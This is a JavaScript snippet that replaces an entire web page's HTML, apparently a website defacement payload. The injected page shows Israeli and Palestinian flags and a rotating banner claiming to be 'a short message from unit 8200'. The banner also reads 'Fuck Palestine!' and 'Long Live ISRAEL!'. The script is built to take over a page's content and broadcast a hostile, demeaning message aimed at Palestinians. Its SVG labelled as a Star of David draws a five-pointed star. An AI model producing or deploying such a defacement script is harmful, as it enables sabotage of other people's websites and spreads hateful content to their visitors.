document.getElementsByTagName("html")[0].innerHTML = `
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Peace Message</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            font-family: Arial, sans-serif;
            background-color: #121212;
            color: #ffffff;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            gap: 20px;
        }

        .flags-container {
            display: flex;
            justify-content: center;
            flex-wrap: wrap;
            gap: 20px;
            width: 100%;
            max-width: 600px;
        }

        .message-wrapper {
            text-align: center;
            font-size: min(2em, 7vw);
            padding: 20px 10px;
            height: 1.2em;
            overflow: hidden;
            position: relative;
            width: 100%;
            max-width: 600px;
        }

        .message {
            position: absolute;
            width: 100%;
            animation: spin-messages 9s infinite;
            opacity: 0;
            transform-origin: center;
            transform: translateY(100%) rotateX(-90deg);
            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
        }

        .message:nth-child(1) { animation-delay: -6s; }
        .message:nth-child(2) { animation-delay: -3s; }
        .message:nth-child(3) { animation-delay: 0s; }

        @keyframes spin-messages {
            0%, 25% {
                opacity: 0;
                transform: translateY(100%) rotateX(-90deg);
            }
            33%, 58% {
                opacity: 1;
                transform: translateY(0) rotateX(0deg);
            }
            66%, 100% {
                opacity: 0;
                transform: translateY(-100%) rotateX(90deg);
            }
        }

        .flag {
            width: min(200px, 45vw);
            height: min(140px, 31.5vw);
            flex: 0 1 auto;
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        /* Israel Flag */
        .israel-flag {
            background: white;
            position: relative;
            border: 1px solid #333;
        }

        .israel-flag::before,
        .israel-flag::after {
            content: '';
            position: absolute;
            left: 0;
            width: 100%;
            height: 30%;
            background: #0038b8;
        }

        .israel-flag::before {
            top: 0;
        }

        .israel-flag::after {
            bottom: 0;
        }

        .star-of-david {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 30%;
            height: 30%;
        }

        /* Palestine Flag - FIXED */
        .palestine-flag {
            background: white;
            position: relative;
            overflow: hidden;
            border: 1px solid #333;
        }

        .palestine-flag::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 46px;
            background: black;
        }

        .palestine-flag::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 46px;
            background: #007A3D;
        }

        .palestine-flag .triangle {
            position: absolute;
            left: 0;
            top: 0;
            width: 0;
            height: 0;
            border-top: 70px solid transparent;
            border-bottom: 70px solid transparent;
            border-left: 100px solid #CE1126;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="flags-container">
            <div class="flag israel-flag">
                <svg class="star-of-david" viewBox="0 0 100 100">
                    <path fill="#0038b8" d="M50,1 L61,37 L97,37 L68,59 L79,95 L50,73 L21,95 L32,59 L3,37 L39,37 Z"/>
                </svg>
            </div>
            <div class="flag palestine-flag">
                <div class="triangle"></div>
            </div>
        </div>
        <div class="message-wrapper">
            <div class="message">A short message from unit 8200</div>
            <div class="message">Fuck Palestine!</div>
            <div class="message">Long Live ISRAEL!</div>
        </div>
    </div>
</body>
</html>`;
